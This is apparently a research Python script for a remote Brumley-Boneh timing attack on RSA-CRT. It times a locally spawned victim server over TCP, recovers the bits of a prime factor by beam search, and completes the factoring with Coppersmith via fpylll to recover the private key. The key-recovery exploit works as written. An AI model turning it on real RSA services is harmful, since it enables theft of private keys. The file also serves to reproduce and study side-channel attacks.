"""
Remote (separate-process) Brumley-Boneh timing attack -- attacker side.

NEW file; reuses the existing, unmodified recovery machinery from
attack_brumley_boneh.py (recover_factor_beam, complete_factor,
diagnose_gap_separability, neighborhood_time) and cpu_pin.py.  The ONLY change
vs the in-process attack is the *oracle*: instead of an in-process victim that
reports rdtsc cycles, we drive a genuinely separate victim process
(bb_victim_server.py) over a localhost TCP socket and measure the round-trip
time OURSELVES.  This is the faithful Brumley-Boneh setup:

  * victim  = uncontrolled server, NOT clock-pinned (its own scheduling/power);
  * attacker= pins only ITS OWN core + raises priority (controls only its own
    measurement environment), and uses the MIN estimator over `repeat`
    round-trips to reject the one-sided IPC/scheduling noise.

To keep the victim unpinned while the attacker is pinned we SPAWN the victim
FIRST (it inherits the default all-core affinity at creation) and pin the
attacker only afterwards -- Windows affinity is inherited at process creation,
so a later SetProcessAffinityMask on the attacker never touches the child.

The `RemoteVictim` client exposes the same tiny interface the recovery code
needs (`.measure`, `.n`, `.q_radix`, `.queries`, and -- for EVALUATION ONLY --
`.q/.d/...` loaded from the shared key file; recovery *decisions* use only
timing, never the secret).

Run (from this directory):
    python attack_remote.py            # full recovery + Coppersmith
    python attack_remote.py diag       # gap-separability AUC of the remote channel
    python attack_remote.py smoke      # correctness + timing sanity, few queries

Parameters/flags can be overridden from a JSON config instead of editing the
source (see run_config.example.json):
    python attack_remote.py full --config my_run.json
    python attack_remote.py my_run.json      # a *.json arg is taken as the config
The config may also set "mode"; an explicit CLI mode token overrides it.
"""

import json
import os
import socket
import subprocess
import sys
import time
from datetime import datetime

_HERE = os.path.dirname(os.path.abspath(__file__))
_ABB = os.path.dirname(_HERE)                 # attack_brumley_boneh/ (shared modules + bb_cache/bb_results)
_ROOT = os.path.dirname(_ABB)                 # montMul/ (montmul_c lives under attack_refined)
for _p in (_HERE, _ABB, os.path.join(_ROOT, "attack_refined"), _ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import cpu_pin  # noqa: E402
import attack_brumley_boneh as abb  # noqa: E402
from bb_victim import load_crt_key  # noqa: E402

# ------------------------------- config ------------------------------------ #
KEY_BITS = 256
KEY_SOURCE = "provable"   # use the project's FIPS 186-5 provable-prime generator
                          # (generate_provable_prime_pair, the CustomRSA core),
                          # not sympy.randprime.
SERVER_BATCH = 80         # victim-side decryptions/request (signal amplifier)

PIN_CORE = 0              # attacker pins THIS core; victim stays unpinned
WARMUP_S = 1.5

# oracle / recovery.  The UNPINNED-victim channel is defeated NOT by more
# min-estimation (the victim's own turbo/DVFS drift moves the compute-time floor
# itself, so a per-cipher min cannot remove it) but by the drift-cancelling
# INTERLEAVED-MIN pairing (INTERLEAVE=True -> RemoteVictim.measure_pair): g and
# ghi are measured cg,chi,cg,chi,... so both minima come from the SAME time
# window and the drift is common-mode.  Measured effect: top-bit gap AUC 0.62
# (block) -> 0.79 (interleave, repeat=12) -> 0.98 (interleave, repeat=24,
# neigh=96) -> 1.00 (interleave, repeat=48, neigh=96, effect 3.26) -- i.e. the
# unpinned channel reaches the PINNED oracle's quality (AUC 1.0).
# Each remote round-trip is ~3.4 ms, so this is a multi-hour full run.
REPEAT = 64               # round-trips per measurement -> min estimator.  Raised
                          # 48->64: the last run derailed on a MARGINAL true-0
                          # bit whose zero-one gap was noise-suppressed to just
                          # above tau; a cleaner min (more round-trips) recovers
                          # the un-contaminated compute-time floor, lifting those
                          # marginal gaps back above threshold.
NEIGH = 128               # 96->128: the neighborhood sum is the "strong
                          # indicator from weak ones" amplifier -- a wider window
                          # widens the 0-bit gap (1-bit stays ~flat), increasing
                          # the margin on exactly the marginal bits that derailed.
SAMPLE = 1
BEAM = 16                 # keep 16: holds the true path through marginal mid
                          # bits.  (Derails are a run-to-run drift lottery, so
                          # stronger repeat/neigh above raise per-bit margins;
                          # stop_on_wrong_bit + resume let us iterate cheaply if
                          # a bad drift realisation still derails.)
REFRESH_DRAWS = 3         # (unused when INTERLEAVE=True: pairs are measured fresh)
INTERLEAVE = True         # paired (drift-cancelling) round-trip measurement via
                          # RemoteVictim.measure_pair -- the fix for the
                          # unpinned-victim frequency drift (see work log).
TAIL_BRUTE = 56           # Coppersmith on the low bits.  qbits=128, so this
                          # recovers 127-56 = 71 top bits of q by timing (vs 79
                          # at tail_brute=48).  fpylll factors this key from the
                          # top >=68 correct bits (u<=60) cleanly, or 66 (u=62)
                          # with the brute margin -- so 71 recovered bits give a
                          # comfortable cushion while NOT spending hours on the
                          # ~8 low bits Coppersmith supplies for free.  The
                          # completion below then progressively DISTRUSTS the
                          # lowest recovered bits (WSL_SWEEP_MAX), so a marginal
                          # mid-bit error below a correct top prefix still factors.

# diagnostic sizing (neigh must be large enough to resolve the sawtooth: a small
# neigh was why an earlier diag saw no interleave benefit)
DIAG_TOP_BITS = 5
DIAG_NEIGH = 96
DIAG_TRIALS = 4

# bounded partial-recovery verification ("partial" mode): recover only the top
# PARTIAL_TOP_BITS of q through the real beam and report per-bit accuracy.  Lets
# us confirm the recovery machinery works over the interleaved-min oracle
# WITHOUT the multi-hour full run.
PARTIAL_TOP_BITS = 6
PARTIAL_BEAM = 4          # smaller beam for the bounded validation run

# WSL/fpylll completion fallback: if the in-repo pure-Python Coppersmith
# (coppersmith.py, fragile on some keys) fails to factor from the recovered
# prefix, automatically invoke the robust fpylll finisher inside WSL via the
# wsl.exe bridge.  The handoff JSON lives under /mnt/d/... so no copying is
# needed.  Set USE_WSL_FPYLLL=False to disable (e.g. if WSL isn't installed).
USE_WSL_FPYLLL = True
WSL_ACTIVATE = "~/cop/bin/activate"   # WSL venv where `import fpylll` works
WSL_BRUTE = 8             # brute-force this many low known bits for edge margin
WSL_SWEEP_MAX = 62        # sweep trusted depth up to this many unknown bits, so
                          # a correct TOP prefix still factors even if a mid/low
                          # bit erred.  62 covers the worst historical case (only
                          # 66 correct top bits -> u=62, right at N^0.25, closed
                          # by the WSL_BRUTE margin); a cleaner run (>=68 correct)
                          # factors earlier in the sweep (u<=60) with no brute.
WSL_DISTRO = ""           # "" = default distro; else e.g. "Ubuntu"
WSL_TIMEOUT_S = 1800

# Interruptible / resumable recovery.  The beam state is checkpointed to
# CHECKPOINT_PATH after every recovered bit; if RESUME is True and a matching
# checkpoint (same key + params) exists, a fresh `full` run continues from the
# last completed bit instead of restarting the multi-hour search.  Only the
# timing measurements already spent are lost on an interruption, never the
# recovered prefix.  To force a clean run, delete the checkpoint file (or set
# RESUME=False).  A mismatched checkpoint (different key/params) is ignored
# automatically.  The checkpoint is removed once recovery fully completes.
RESUME = True
CHECKPOINT_PATH = os.path.join(
    _ABB, "bb_results", "remote_unpinned_victim", "full_run_checkpoint.json")

# Early stop (evaluation-only): abort and return partial results as soon as the
# recovery derails unrecoverably (the true prefix has left the beam), instead of
# grinding the remaining bits for hours on a corrupted prefix.  Default True.
# Set False for a blind/complete run that ignores the known secret.
STOP_ON_WRONG_BIT = True

# Save the FULL per-bit series (delta/tau/Tg/Tghi/neigh/queries/elapsed_s) for
# EVERY surviving beam leaf -- not just the top-scoring path -- under
# `beam_leaves_full` in results.json.  This is what lets you plot the winning
# (often non-top) leaf that actually factors N, not only the main path.  Costs
# ~beam_width x the per_bit block in the JSON; set False for lean runs (only the
# leaf prefixes + the main path's per_bit are then saved).
SAVE_ALL_LEAF_RECORDS = True
# --------------------------------------------------------------------------- #


class RemoteVictim:
    """Attacker-side client: same interface the recovery code expects, but every
    `measure` is an EXTERNAL round-trip timing to the separate victim process."""

    def __init__(self, sock, key_eval, repeat):
        self.sock = sock
        self._rf = sock.makefile("r")
        n_hex, e_hex = self._rf.readline().split()
        self.n = int(n_hex, 16)
        self.e = int(e_hex, 16)
        # EVALUATION-ONLY secret (shared key file); NOT used for any decision.
        self.q = key_eval["q"]
        self.d = key_eval["d"]
        self.p = key_eval["p"]
        self.d1 = key_eval["d1"]
        self.d2 = key_eval["d2"]
        self.repeat = max(1, int(repeat))
        self.timing = "real"
        self.queries = 0

    def q_radix(self):
        """Public: Montgomery radix of the q-half, from the (public) key size.
        The attacker does not know q, only that primes are balanced -> q has
        ceil((nbits/2)/64) limbs."""
        qbits = self.n.bit_length() // 2
        s = (qbits + 63) // 64
        return 1 << (64 * s)

    def _one_roundtrip(self, msg):
        t0 = time.perf_counter()
        self.sock.sendall(msg)
        self._rf.readline()                 # block until the response line
        dt = time.perf_counter() - t0
        self.queries += 1
        return dt

    def measure(self, cipher):
        """min over `repeat` external round-trips (rejects one-sided IPC/OS
        noise) -- the attacker-side min estimator, faithful to B-B's repeated
        queries."""
        msg = ("%X\n" % (cipher % self.n)).encode()
        best = None
        for _ in range(self.repeat):
            dt = self._one_roundtrip(msg)
            if best is None or dt < best:
                best = dt
        return best

    def measure_pair(self, cg, chi):
        """Drift-cancelling INTERLEAVED-MIN estimator for the UNPINNED victim.

        The unpinned victim's turbo/DVFS frequency drift moves the true
        compute-time floor itself, so a per-cipher `min` measured in a separate
        block (as the plain block-interleave does: a full min-block of cg, then
        a full min-block of chi) catches its two minima in DIFFERENT time
        windows => different victim frequencies => the drift leaks into the gap
        T(cg) - T(chi) (the work log's root cause for the ~0.75-AUC failure).

        Fix (measured: doubles the effect size, AUC 0.62 -> 0.79 on this host):
        measure cg,chi,cg,chi,... at the ROUND-TRIP level and return
        (min over cg-samples, min over chi-samples).  Both minima are then drawn
        from the SAME interleaved window, so the slow frequency drift is
        common-mode and cancels in the difference, while the `min` still rejects
        the one-sided IPC/interrupt tail.  This is the correct estimator for
        "one-sided contamination + slow common drift"; it combines B-B's min
        estimator with a same-window differential.
        """
        mg = ("%X\n" % (cg % self.n)).encode()
        mh = ("%X\n" % (chi % self.n)).encode()
        bg = bh = None
        for _ in range(self.repeat):
            tg = self._one_roundtrip(mg)
            th = self._one_roundtrip(mh)     # interleaved, right after cg
            bg = tg if bg is None else min(bg, tg)
            bh = th if bh is None else min(bh, th)
        return bg, bh

    def close(self):
        try:
            self.sock.sendall(b"BYE\n")
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def spawn_victim(port, key_file):
    """Spawn the victim BEFORE the attacker pins itself, so it inherits the
    default (all-core, normal-priority) environment = unpinned server.

    Uses --reuse-key: the provable key is pre-generated into `key_file` (see
    main()), so the victim loads it instantly instead of generating it during
    spawn -- avoids both a long silent stall and any provable-prime keygen
    chatter racing the READY handshake."""
    server = os.path.join(_HERE, "bb_victim_server.py")
    proc = subprocess.Popen(
        [sys.executable, "-u", server, "--host", "127.0.0.1",
         "--port", str(port), "--key-file", key_file,
         "--key-bits", str(KEY_BITS), "--key-source", KEY_SOURCE,
         "--reuse-key", "--batch", str(SERVER_BATCH)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    # Read lines until READY (tolerate any pre-READY chatter); a dead victim
    # yields EOF ('') which we surface.
    while True:
        line = proc.stdout.readline()
        if not line:
            raise RuntimeError("victim exited early: %s"
                               % (proc.stdout.read() or "<no output>"))
        if line.startswith("READY"):
            return proc
        # otherwise: keygen/other chatter -> keep waiting


def connect(port):
    sock = socket.create_connection(("127.0.0.1", port), timeout=10)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return sock


# --------------------------------------------------------------------------- #
# JSON run-config: override any of the module-level parameters/flags from a file
# so runs are configured without editing the source.  A JSON key (lowercase)
# maps to the module global (UPPERCASE); values are applied by overwriting the
# global, so every function that reads the global picks up the override.
# Usage:  python attack_remote.py full --config my_run.json
#         python attack_remote.py my_run.json          (a *.json arg = the config)
# Keys absent from the file keep their built-in defaults.  A null value or a key
# starting with "_" (e.g. "_comment") is ignored, and unknown keys warn.
# --------------------------------------------------------------------------- #
_CONFIG_KEYS = {
    "key_bits": "KEY_BITS", "key_source": "KEY_SOURCE",
    "server_batch": "SERVER_BATCH", "pin_core": "PIN_CORE", "warmup_s": "WARMUP_S",
    "repeat": "REPEAT", "neigh": "NEIGH", "sample": "SAMPLE", "beam": "BEAM",
    "refresh_draws": "REFRESH_DRAWS", "interleave": "INTERLEAVE",
    "tail_brute": "TAIL_BRUTE",
    "diag_top_bits": "DIAG_TOP_BITS", "diag_neigh": "DIAG_NEIGH",
    "diag_trials": "DIAG_TRIALS",
    "partial_top_bits": "PARTIAL_TOP_BITS", "partial_beam": "PARTIAL_BEAM",
    "use_wsl_fpylll": "USE_WSL_FPYLLL", "wsl_activate": "WSL_ACTIVATE",
    "wsl_brute": "WSL_BRUTE", "wsl_sweep_max": "WSL_SWEEP_MAX",
    "wsl_distro": "WSL_DISTRO", "wsl_timeout_s": "WSL_TIMEOUT_S",
    "resume": "RESUME", "checkpoint_path": "CHECKPOINT_PATH",
    "stop_on_wrong_bit": "STOP_ON_WRONG_BIT",
    "save_all_leaf_records": "SAVE_ALL_LEAF_RECORDS",
}


def load_config(path):
    """Overlay a JSON config onto the module globals.  Returns the dict of
    applied overrides (plus an optional "mode")."""
    with open(path) as fh:
        cfg = json.load(fh)
    applied, unknown = {}, []
    for k, v in cfg.items():
        if k.startswith("_") or v is None:      # comments / "keep default"
            continue
        if k == "mode":
            applied["mode"] = v
            continue
        g = _CONFIG_KEYS.get(k)
        if g is None:
            unknown.append(k)
            continue
        globals()[g] = v
        applied[k] = v
    if unknown:
        print("[config] WARNING: ignored unknown key(s): %s" % ", ".join(unknown))
    print("[config] loaded %d override(s) from %s" % (len(applied), path))
    for k in sorted(applied):
        if k != "mode":
            print("           %-22s = %r" % (k, applied[k]))
    return applied


def _find_config_path(argv):
    """--config PATH, or the first *.json positional argument."""
    if "--config" in argv:
        i = argv.index("--config")
        return argv[i + 1] if i + 1 < len(argv) else None
    return next((a for a in argv if a.lower().endswith(".json")), None)


def main():
    argv = sys.argv[1:]
    cfg_path = _find_config_path(argv)
    cfg_mode = None
    if cfg_path:
        cfg_mode = load_config(cfg_path).get("mode")
    # explicit CLI mode token wins over a mode set in the config; else "full".
    mode = next((a for a in argv
                 if a in ("full", "diag", "smoke", "partial")),
                cfg_mode or "full")
    key_file = os.path.join(_ABB, "bb_cache",
                            "remote_keybits_%d" % KEY_BITS, "key.json")
    os.makedirs(os.path.dirname(key_file), exist_ok=True)

    # 1) victim first (unpinned) ...
    port = _free_port()
    print("[remote] spawning UNPINNED victim on port %d (server batch=%d) ..."
          % (port, SERVER_BATCH))
    proc = spawn_victim(port, key_file)

    # 2) ... then pin ONLY the attacker.
    print("[remote] pinning ATTACKER to core %d (victim left unpinned)" % PIN_CORE)
    cpu_pin.pin_process(core=PIN_CORE, high_priority=True, verbose=True)
    if WARMUP_S > 0:
        cpu_pin.warmup(WARMUP_S)

    sock = connect(port)
    key_eval = load_crt_key(key_file)
    vic = RemoteVictim(sock, key_eval, repeat=REPEAT)
    R = vic.q_radix()
    radix_inv = pow(R, -1, vic.n)
    qbits = (vic.n.bit_length() + 1) // 2
    beta = min(0.5, qbits / vic.n.bit_length())

    print("[remote] N=%d bits | oracle=EXTERNAL round-trip (repeat=%d min) | "
          "mode=%s" % (vic.n.bit_length(), REPEAT, mode))

    try:
        if mode == "smoke":
            _smoke(vic, radix_inv)
            return
        if mode == "diag":
            diag = abb.diagnose_gap_separability(
                vic, radix_inv, qbits, top_bits=DIAG_TOP_BITS, neigh=DIAG_NEIGH,
                sample=SAMPLE, trials=DIAG_TRIALS, verbose=True)
            print("[remote-diag] block AUC=%.3f  interleave AUC=%.3f  (%d queries)"
                  % (diag["block"]["auc"], diag["interleave"]["auc"], vic.queries))
            _save({"mode": "diag", "diag": diag, "queries": vic.queries,
                   "server_batch": SERVER_BATCH, "repeat": REPEAT})
            return

        if mode == "partial":
            # Bounded recovery: recover only the top PARTIAL_TOP_BITS of q
            # through the real beam + interleaved-min oracle and report per-bit
            # accuracy.  tail_brute is set so exactly PARTIAL_TOP_BITS gap bits
            # are recovered; completion is expected to return None (the tail is
            # far too large to brute/Coppersmith) -- this mode validates the
            # recovery MACHINERY over the new oracle, not the full factorisation.
            tail = qbits - 1 - PARTIAL_TOP_BITS
            t0 = time.perf_counter()
            prefix, records, _q = abb.recover_factor_beam(
                vic, radix_inv, qbits, neigh=NEIGH, sample=SAMPLE,
                tail_brute=tail, adaptive_neigh=True, beam_width=PARTIAL_BEAM,
                interleave=INTERLEAVE, beta=beta, refresh_draws=REFRESH_DRAWS,
                verbose=True)
            secs = time.perf_counter() - t0
            bits_total = len(records)
            bits_correct = sum(r["correct"] for r in records)
            first_err = next((r["bit"] for r in records if not r["correct"]),
                             None)
            print("-" * 78)
            print("REMOTE PARTIAL RECOVERY (top %d bits of q, interleaved-min "
                  "oracle)" % PARTIAL_TOP_BITS)
            print("-" * 78)
            print("  top-path per-bit accuracy : %d/%d = %.1f%%"
                  % (bits_correct, bits_total,
                     100 * bits_correct / bits_total if bits_total else 0))
            print("  first wrong bit           : %s"
                  % ("none (all correct)" if first_err is None else first_err))
            print("  queries (round-trips)     : %d" % vic.queries)
            print("  wall time                 : %.1fs" % secs)
            _save({"mode": "partial", "top_bits": PARTIAL_TOP_BITS,
                   "server_batch": SERVER_BATCH, "repeat": REPEAT, "neigh": NEIGH,
                   "beam_width": PARTIAL_BEAM, "interleave": INTERLEAVE,
                   "bits_total": bits_total, "bits_correct": bits_correct,
                   "first_error_bit": first_err, "queries": vic.queries,
                   "seconds": secs,
                   "per_bit": _per_bit(records)})
            return

        # full recovery (reusing the unmodified beam + Coppersmith)
        os.makedirs(os.path.dirname(CHECKPOINT_PATH), exist_ok=True)
        if RESUME and os.path.exists(CHECKPOINT_PATH):
            print("[remote] RESUME: found checkpoint %s -- continuing recovery "
                  "from the last completed bit" % CHECKPOINT_PATH)
        t0 = time.perf_counter()
        beam_leaves = []
        prefix, records, q_rec = abb.recover_factor_beam(
            vic, radix_inv, qbits, neigh=NEIGH, sample=SAMPLE,
            tail_brute=TAIL_BRUTE, adaptive_neigh=True, beam_width=BEAM,
            interleave=INTERLEAVE, beta=beta, refresh_draws=REFRESH_DRAWS,
            verbose=True, checkpoint_path=CHECKPOINT_PATH, resume=RESUME,
            stop_on_wrong_bit=STOP_ON_WRONG_BIT, beam_out=beam_leaves,
            include_leaf_records=SAVE_ALL_LEAF_RECORDS)
        # Recovery finished: drop the checkpoint so a later run starts fresh.
        try:
            if os.path.exists(CHECKPOINT_PATH):
                os.remove(CHECKPOINT_PATH)
        except OSError:
            pass
        if q_rec is None:
            q_rec = abb.complete_factor(vic.n, prefix, TAIL_BRUTE, beta=beta,
                                        verbose=True)
        completion_method = "coppersmith_py" if q_rec is not None else None
        secs = time.perf_counter() - t0

        # Create the run dir up front and drop the handoff file, so the WSL
        # fpylll finisher can be invoked on it (and it stays for a later retry).
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        out_dir = os.path.join(_ABB, "bb_results", "remote_unpinned_victim",
                               "remote_%s_kb%d" % (ts, KEY_BITS))
        os.makedirs(out_dir, exist_ok=True)
        _write_completion_input(out_dir, vic.n, prefix, TAIL_BRUTE, beta, vic.e,
                                candidates=beam_leaves)

        # Robust fallback: if the fragile pure-Python Coppersmith did not
        # factor, invoke the fpylll finisher in WSL on the same handoff file.
        wsl_out = None
        if q_rec is None and USE_WSL_FPYLLL:
            print("  [completion] pure-Python Coppersmith did not factor; "
                  "invoking fpylll in WSL ...")
            wsl_out = _run_wsl_coppersmith(out_dir, WSL_BRUTE)
            if wsl_out and wsl_out.get("factored") and wsl_out.get("q_hex"):
                cand = int(wsl_out["q_hex"], 16)
                if vic.n % cand == 0:
                    q_rec = cand
                    completion_method = "wsl_fpylll(brute=%d)" % (
                        wsl_out.get("brute_tried", 0))

        bits_total = len(records)
        bits_correct = sum(r["correct"] for r in records)
        factored = q_rec is not None and vic.n % q_rec == 0
        d_rec = None
        if factored:
            p_rec = vic.n // q_rec
            try:
                d_rec = pow(vic.e, -1, (p_rec - 1) * (q_rec - 1))
            except Exception:
                d_rec = None
        d_match = (d_rec == vic.d) if d_rec is not None else None

        print("-" * 78)
        print("REMOTE RESULTS (attacker-pinned, victim-unpinned, external timing)")
        print("-" * 78)
        print("  gap per-bit accuracy : %d/%d = %.1f%%"
              % (bits_correct, bits_total,
                 100 * bits_correct / bits_total if bits_total else 0))
        print("  queries (round-trips): %d" % vic.queries)
        print("  wall time            : %.1fs" % secs)
        if factored:
            print("  FACTORED N : q = %X  (via %s)" % (q_rec, completion_method))
            print("  d recovered: %s" % ("MATCHES victim key" if d_match
                                         else "mismatch"))
            print("  >>> SUCCESS: full private key recovered over the REMOTE "
                  "(externally-timed) oracle")
        else:
            print("  >>> N not factored this run.")
        planned_total = qbits - 1 - TAIL_BRUTE
        early_stopped = bits_total < planned_total
        # leading consecutive-correct recovered bits = trustworthy top prefix
        # (this is what Coppersmith actually needs); +1 for the always-known MSB.
        lead = 0
        for r in records:
            if r["correct"]:
                lead += 1
            else:
                break
        # Compact per-leaf summary (always) + optional full per-bit series per
        # leaf (when SAVE_ALL_LEAF_RECORDS) so the winning non-top leaf is
        # plottable, not just the main path.  The summary is what the completion
        # candidates were built from; the full block is separate to keep it
        # optional/greppable.
        beam_leaves_summary = [
            {"prefix_hex": c["prefix_hex"], "score": c["score"],
             "leading_correct": c["leading_correct"]} for c in beam_leaves]
        beam_leaves_full = [
            {"prefix_hex": c["prefix_hex"], "score": c["score"],
             "leading_correct": c["leading_correct"],
             "per_bit": _per_bit(c["records"])}
            for c in beam_leaves if "records" in c] or None
        _save({
            "mode": "full",
            "timestamp": ts,
            "schema": "bb_remote_full_v2",
            # ---- everything needed to reproduce / label a plot -------------- #
            "params": {
                "key_bits": KEY_BITS, "key_source": KEY_SOURCE,
                "modulus_bits": vic.n.bit_length(), "qbits": qbits,
                "server_batch": SERVER_BATCH, "pin_core": PIN_CORE,
                "warmup_s": WARMUP_S, "repeat": REPEAT, "neigh": NEIGH,
                "sample": SAMPLE, "beam_width": BEAM,
                "refresh_draws": REFRESH_DRAWS, "interleave": INTERLEAVE,
                "adaptive_neigh": True, "tau_frac": 0.3,
                "tail_brute": TAIL_BRUTE, "beta": beta,
                "stop_on_wrong_bit": STOP_ON_WRONG_BIT,
                "planned_bits": planned_total,
                "wsl_fpylll": USE_WSL_FPYLLL, "wsl_brute": WSL_BRUTE,
                "wsl_sweep_max": WSL_SWEEP_MAX,
                "oracle": "external_roundtrip_min_interleaved",
            },
            # ---- headline outcome ------------------------------------------- #
            "factored": factored,
            "completion_method": completion_method,
            "q_recovered": ("%X" % q_rec) if q_rec else None,
            "d_recovered_matches": d_match,
            "wsl_completion": wsl_out,
            # ---- recovery quality metrics (for correctness plots) ----------- #
            "bits_total": bits_total,
            "bits_correct": bits_correct,
            "per_bit_accuracy": (bits_correct / bits_total) if bits_total else 0.0,
            "leading_correct_bits": lead,
            "correct_top_bits_of_q": lead + 1,
            "first_error_bit": next((r["bit"] for r in records
                                     if not r["correct"]), None),
            "early_stopped": early_stopped,
            # ---- cost / runtime metrics (for measurements/runtime plots) ---- #
            "queries": vic.queries,
            "seconds": secs,
            # ---- handoff / completion (no secret) --------------------------- #
            "prefix_hex": "%X" % prefix,
            "unknown_bits": TAIL_BRUTE,
            "n_hex": "%X" % vic.n,
            "e": vic.e,
            # all surviving beam-leaf prefixes (best score first) + eval-only
            # leading-correct count -> shows at what rank the true path survived.
            "beam_leaves": beam_leaves_summary,
            # full per-bit series for EVERY leaf (None if SAVE_ALL_LEAF_RECORDS
            # is off) -> lets the winning non-top leaf be plotted too.
            "beam_leaves_full": beam_leaves_full,
            # ---- full per-bit series (delta/tau/Tg/Tghi/queries/elapsed) ---- #
            "per_bit": _per_bit(records),
        }, out_dir=out_dir)
    finally:
        vic.close()
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


def _smoke(vic, radix_inv):
    """Correctness + timing sanity on a few queries."""
    import random
    ok = True
    for _ in range(5):
        c = random.randrange(2, vic.n)
        msg = ("%X\n" % c).encode()
        vic.sock.sendall(msg)
        m = int(vic._rf.readline().strip(), 16)
        vic.queries += 1
        if m != pow(c, vic.d, vic.n):
            ok = False
    # a few timings on the R^{-1}-mapped attack inputs
    g = vic.q if False else (vic.n >> 2)     # arbitrary probe magnitude
    samples = [vic.measure(abb.cipher_for(g, radix_inv, vic.n)) for _ in range(8)]
    print("[smoke] CRT decrypt correct = %s" % ok)
    print("[smoke] measured round-trip (min of %d) samples (s): %s"
          % (vic.repeat, ["%.6f" % s for s in samples]))
    print("[smoke] queries so far: %d" % vic.queries)


def _per_bit(records):
    """Full per-bit record for plotting: the zero-one gap (delta) and threshold
    (tau), the raw neighborhood timings (Tg, Tghi), the decision vs the true
    bit, the neighborhood size, and the cumulative queries / elapsed time at
    that bit (for cost/runtime-vs-recovered-bits curves)."""
    out = []
    for r in records:
        out.append({
            "bit": r.get("bit"),
            "decided": r.get("decided"),
            "actual": r.get("actual"),
            "correct": r.get("correct"),
            "delta": r.get("delta"),
            "tau": r.get("tau"),
            "Tg": r.get("Tg"),
            "Tghi": r.get("Tghi"),
            "neigh": r.get("neigh"),
            "queries": r.get("queries"),
            "elapsed_s": r.get("elapsed_s"),
        })
    return out


def _save(obj, out_dir=None):
    if out_dir is None:
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        out_dir = os.path.join(_ABB, "bb_results", "remote_unpinned_victim",
                               "remote_%s_kb%d" % (ts, KEY_BITS))
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, "results.json")
    with open(path, "w") as fh:
        json.dump(obj, fh, indent=2)
    print("  artifacts: %s" % path)
    return out_dir


def _win_to_wsl_path(p):
    """Translate a Windows path to the WSL /mnt view (D:\\a\\b -> /mnt/d/a/b)."""
    p = os.path.abspath(p)
    drive, rest = os.path.splitdrive(p)
    drive = drive.rstrip(":").lower()
    rest = rest.replace("\\", "/")
    return "/mnt/%s%s" % (drive, rest)


def _run_wsl_coppersmith(out_dir, brute):
    """Invoke coppersmith_fpylll.py inside WSL on this run's completion_input.json.

    Returns the parsed completion_output.json dict (or None).  Uses the wsl.exe
    bridge; the input/output JSON are shared through /mnt/d/... so nothing is
    copied.  Non-fatal: any failure just returns None and the run reports the
    pure-Python result."""
    inp_wsl = _win_to_wsl_path(os.path.join(out_dir, "completion_input.json"))
    script_wsl = _win_to_wsl_path(os.path.join(_HERE, "coppersmith_fpylll.py"))
    inner = "source %s && python3 '%s' '%s'" % (WSL_ACTIVATE, script_wsl,
                                                inp_wsl)
    if brute and brute > 0:
        inner += " --brute %d" % brute
    if WSL_SWEEP_MAX and WSL_SWEEP_MAX > 0:
        inner += " --sweep-max %d" % WSL_SWEEP_MAX
    cmd = ["wsl.exe"]
    if WSL_DISTRO:
        cmd += ["-d", WSL_DISTRO]
    cmd += ["bash", "-lc", inner]
    print("  [wsl] %s" % inner)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=WSL_TIMEOUT_S)
    except Exception as exc:
        print("  [wsl] invocation failed: %r "
              "(is WSL installed and the venv path correct?)" % exc)
        return None
    if proc.stdout:
        print(proc.stdout.rstrip())
    if proc.returncode not in (0, 2) and proc.stderr:
        print("  [wsl] stderr: %s" % proc.stderr.rstrip())
    out_path = os.path.join(out_dir, "completion_output.json")
    if os.path.exists(out_path):
        try:
            with open(out_path) as fh:
                return json.load(fh)
        except Exception:
            return None
    return None


def _write_completion_input(out_dir, n, prefix, unknown_bits, beta, e,
                            candidates=None):
    """Write a small JSON the Coppersmith completion step consumes.

    Contains only public values + the recovered prefix (no secret): N, e, the
    recovered high-bits prefix of q (unknown low bits zeroed), how many low bits
    are unknown, and beta.  The WSL/fpylll finisher (coppersmith_fpylll.py) reads
    exactly this, so the multi-hour recovery never has to be re-run to retry a
    stronger completion.

    ``candidates`` (optional): ALL surviving beam-leaf prefixes (best score
    first).  On the noisy oracle the fully-correct prefix is often NOT the
    top-scoring leaf, so the finisher tries every candidate -- this is what lets
    a correct-but-not-top beam path factor N even when the top path derailed.
    """
    payload = {
        "n_hex": "%X" % n,
        "e": e,
        "prefix_hex": "%X" % prefix,       # a = recovered top bits, low bits = 0
        "unknown_bits": unknown_bits,      # X = 2**unknown_bits bounds the tail
        "beta": beta,
    }
    if candidates:
        payload["candidates"] = [
            {"prefix_hex": c["prefix_hex"], "unknown_bits": unknown_bits,
             "score": c.get("score"), "leading_correct": c.get("leading_correct")}
            for c in candidates
        ]
    path = os.path.join(out_dir, "completion_input.json")
    with open(path, "w") as fh:
        json.dump(payload, fh, indent=2)
    print("  completion input: %s (%d candidate prefixes)"
          % (path, len(payload.get("candidates", [])) or 1))
    return path


if __name__ == "__main__":
    main()
